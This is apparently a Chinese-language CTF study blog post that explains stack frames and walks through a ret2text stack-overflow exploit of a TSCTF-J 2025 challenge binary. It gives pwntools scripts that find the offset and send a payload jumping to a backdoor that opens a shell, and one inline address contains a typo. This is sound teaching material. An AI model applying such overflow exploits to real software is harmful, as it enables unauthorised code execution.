---
title: pwn学习记录（其一）
abbrlink: e04c41db
tags:  
 - CTF
 - pwn
date: 2025-11-2
categories: 
 - CTF
---

# 函数调用过程

1. call func=push eip,jmp
2. push ebp
3. mov ebp,esp
4. sub esp,0x20
...
5. leave = mov esp,ebp;pop ebp
6. ret = pop eip

## push,pop指令小结

### push

执行push ax指令时，相当于将指针减小，再将ax中的内容放入指针所指的内存单元处，指针指向新栈顶

### pop

执行pop ax指令时，相当于将指针所指的内容放入ax处，再将指针增大，指针指向新栈顶

---

# ret2text基础其一(以TSCTF-J ret题为例)

## 原理

由于程序使用了gets，strcpy等易溢出函数，导致读取的数据溢出，覆盖栈上的返回地址和控制参数，使指针跳转到想要的func地址位置。

### 常见溢出函数

gets；scanf；strcpy；sprintf：memcpy；strcat……

## checksec

checksec函数可以用来查看程序开了什么保护措施
![checksec 返回结果](/images/pwn1/checksec.png "返回结果")
No canary found即意味可以利用栈溢出来获得shell

## cyclic

通过cyclic生成指定长度的字符串，注入字符串，可以知道栈的大小
![cyclic 示意](/images/pwn1/cyc1.png "示例")
![cyclic 示意](/images/pwn1/cyc2.png "示例")
如图，在注入16个字符时程序并没有报错，而注入24个字符时程序报错，说明想要使栈溢出，至少要注入24个字符
或是构建脚本

    from pwn import *
    context.log_level = 'debug'
    # 生成测试pattern
    io = process('./pwn')
    pattern = cyclic(100)
    io.sendlineafter(b'Just a simple sign-in!', pattern)
    io.wait()
    # 分析崩溃地址
    core = io.corefile
    rip = core.rip
    print(f"崩溃地址: {hex(rip)}")
    # 计算偏移量
    offset = cyclic_find(rip & 0xffffffffffff)
    print(f"精确偏移量: {offset}")

## ret

在ida中打开程序，注意到main函数，vuln函数，和backdoor函数，一个是主函数，另一个是可以利用的漏洞，而最后一个和打通这个程序息息相关
![total](/images/pwn1/total.png "total")
![main](/images/pwn1/main.png "main")
![vuln](/images/pwn1/vuln.png "vuln")
![backdoor](/images/pwn1/backdoor.png "backdoor")

不仅可以通过cyclic查看溢出需要的字节数，也可以通过ida查看计算
![stack](/images/pwn1/stack.png "stack")
如图vuln占据了8+10=18个字节，而rbp本身还占8个字节，因此需要24个字节，计算结果与cyclic结果相同

接下来找到backdoor地址来跳转（0x400676）
![backdoor](/images/pwn1/backdoor_addr.png "backdoor")
接下来构建payload=b'a'*24+p64(0X4006760)

    io=process('./pwn')
    io.recvuntil('Welcome to TSCTF-J2025!\nJust a simple sign-in!\n')
    payload=b'a'*24+p64(0x400676)
    io.send(payload)
    io.interactive()

提交后发现无法成功
![wrongpayload](/images/pwn1/fail.png "wrong")
这是因为还需要栈对齐（这与本地的操作系统有一定关系）
详细可查看[栈对齐](https://zhuanlan.zhihu.com/p/611961995 "CTFer成长日记12：栈对齐—获取shell前的临门一脚")

在payload中加上p64(ret)
![success](/images/pwn1/success.png "success")
输入命令ls后列出目录，说明已经获得权限

## 官方wp

以上是做题时的想法，接下来展示官方给出的做法

    io=process('./pwn')
    io.recvuntil('Welcome to TSCTF-J2025!\nJust a simple sign-in!\n')
    payload=b'a'*24+p64(0x40067a)
    io.send(payload)
    io.interactive()    

0x40067a 所对应的汇编代码为``mov edi, offset command ; "/bin/sh"``类似于直接执行system，跳过了前面的``push rbp``，也就不用栈对齐,更加简洁，也可能更加不稳定(?)，但值得借鉴

 
